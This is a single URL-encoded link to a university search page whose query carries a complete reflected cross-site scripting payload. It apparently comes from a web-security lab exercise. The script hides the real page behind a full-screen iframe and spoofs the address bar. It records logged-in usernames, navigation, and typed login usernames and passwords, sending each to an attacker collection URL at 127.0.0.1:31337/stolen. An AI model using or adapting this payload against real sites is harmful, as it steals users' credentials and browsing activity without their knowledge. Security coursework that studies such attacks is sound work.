http://trurl.cs.illinois.edu/search?q=%3CSCRIPT%3E%20function%20payload(attacker)%20{%20%20%20%20%20%20var%20firstload%20=%200;%20%20%20%20%20%20function%20log(data)%20{%20%20%20%20%20%20%20%20%20console.log($.param(data));%20%20%20%20%20%20%20%20%20$.get(attacker,%20data);%20%20%20%20%20}%20%20%20%20%20%20%20function%20getPath(url)%20{%20%20%20%20%20%20%20%20%20return%20url.match(/(\/.*)/)[1];%20%20%20%20%20}%20%20%20%20%20function%20changeAddressBar(url)%20{%20%20%20%20%20%20%20%20%20try%20{%20%20%20%20%20%20%20%20%20%20%20%20%20window.history.replaceState({},%20%22%22,%20url);%20%20%20%20%20%20%20%20%20}%20catch(e)%20{}%20%20%20%20%20}%20%20%20%20%20%20%20function%20proxy(attacker,%20mainhref)%20{%20%20%20%20%20%20%20%20%20$(%27body%27).children().hide();%20%20%20%20%20%20%20%20%20var%20i%20=%20$(%27%3Ciframe%20id=_track%3E%27)%20%20%20%20%20%20%20%20%20.css({%20%20%20%20%20%20%20%20%20position:%20%27absolute%27,%20%20%20%20%20%20%20%20%20width:%20%27100%%27,%20%20%20%20%20%20%20%20%20height:%20%27100%%27,%20%20%20%20%20%20%20%20%20top:%200,%20%20%20%20%20%20%20%20%20left:%200,%20%20%20%20%20%20%20%20%20border:%200,%20%20%20%20%20%20%20%20%20background:%20%27#fff%27%20%20%20%20%20})%20%20%20%20%20.attr(%27sandbox%27,%20%27allow-same-origin%20allow-forms%20allow-scripts%27)%20%20%20%20%20.attr(%27src%27,%22http://trurl.cs.illinois.edu/%22)%20%20%20%20%20.appendTo(%27body%27)%20%20%20%20%20.load(function()%20{%20%20%20%20%20if(firstload%20==%200)%20{%20%20%20%20%20%20%20%20%20changeAddressBar(%22http://trurl.cs.illinois.edu/%22);%20%20%20%20%20log(attacker,%20{event:%20%22nav%22,%20user:%20$(%22#_track%22).contents().find(%22#logged-in-user%22).text(),uri:%20mainhref});%20%20%20%20%20%20%20%20%20firstload%20=%20firstload+1;%20%20%20%20%20}%20$(%22#_track%22).contents().find(%22.list-group%22).hide();%20%20%20%20%20$(%27body%27,this.contentDocument)%20%20%20%20%20%20%20%20%20.find(%27a%27)%20%20%20%20%20%20%20%20%20%20%20%20%20.click(function()%20{%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20log(attacker,%20{event:%27nav%27,%20user:%20$(%22#_track%22).contents().find(%22#logged-in-user%22).text(),uri:%20this.href});%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20changeAddressBar(this.href);%20%20%20%20%20%20%20%20%20%20%20%20%20})%20%20%20%20%20.end()%20%20%20%20%20.find(%27form%27)%20%20%20%20%20.submit(function()%20{%20%20%20%20%20%20%20%20%20if($(this).attr(%27action%27)%20==%20%22./login%22)%20{%20%20%20%20%20%20%20%20%20var%20str%20=%20$(this).serialize();%20%20%20%20%20%20%20%20%20var%20struser%20=%20%22%22;%20%20%20%20%20%20%20%20%20var%20eqindex%20=%20str.indexOf(%22=%22);%20%20%20%20%20%20%20%20%20var%20andindex%20=%20str.indexOf(%22&%22);%20%20%20%20%20%20%20%20%20struser%20=%20str.substring(eqindex%20+%201,%20andindex);%20%20%20%20%20%20%20%20%20var%20strpass%20=%20%22%22;%20%20%20%20%20%20%20%20%20var%20eqindex2%20=%20str.lastIndexOf(%22=%22);%20%20%20%20%20%20%20%20%20strpass%20=%20str.substring(eqindex2%20+%201,%20str.length);%20%20%20%20%20%20%20%20%20log(attacker,%20{event:%20%27login%27,%20user:%20struser,%20pass:%20strpass});%20%20%20%20%20%20%20%20%20}%20%20%20%20%20%20%20%20%20else%20if($(this).attr(%27action%27)%20==%20%22./logout%22){%20%20%20%20%20%20%20%20%20%20%20%20%20log(attacker,%20{event:%20%27logout%27,%20user:%20$(%22#_track%22).contents().find(%22#logged-in-user%22).text()})%20%20%20%20%20%20%20%20%20}%20%20%20%20%20%20%20%20%20else%20{%20%20%20%20%20%20%20%20%20%20%20%20%20var%20struri%20=%20%22http://trurl.cs.illinois.edu/search?%22%20+%20%22q=%22%20+%20$(%22#_track%22).contents().find(%22#query%22).val();%20%20%20%20%20%20%20%20%20%20%20%20%20changeAddressBar(struri);%20%20%20%20%20%20%20%20%20%20%20%20%20log(attacker,%20{event:%27nav%27,%20user:%20$(%22#_track%22).contents().find(%22#logged-in-user%22).text(),uri:%20struri%20})%20%20%20%20%20%20%20%20%20}%20%20%20%20%20})%20%20%20%20%20.end();%20});%20}%20%20%20%20%20proxy(attacker,%20%22http://trurl.cs.illinois.edu/%22);%20}%20function%20makeLink(xssdefense,%20target,%20attacker)%20{%20return%20target%20+%20%22./search?xssdefense=%22%20+%20xssdefense.toString()%20+%20%22&q=%22%20+%20encodeURIComponent(%22%3Cscript%22%20+%20%22%3E%22%20+%20payload.toString()%20+%20%22;payload(\%22%22%20+%20attacker%20+%20%22\%22);%3C/script%22%20+%20%22%3E%22);%20}%20var%20xssdefense%20=%200;%20var%20target%20=%20%22http://trurl.cs.illinois.edu/%22;%20var%20attacker%20=%20%22http://127.0.0.1:31337/stolen%22;%20%20$(function()%20{%20var%20url%20=%20makeLink(xssdefense,%20target,%20attacker);%20$(%22#query-lbl%22).text(%27%27);%20window.location.href%20=%20url;%20});%20%3C/SCRIPT%3E
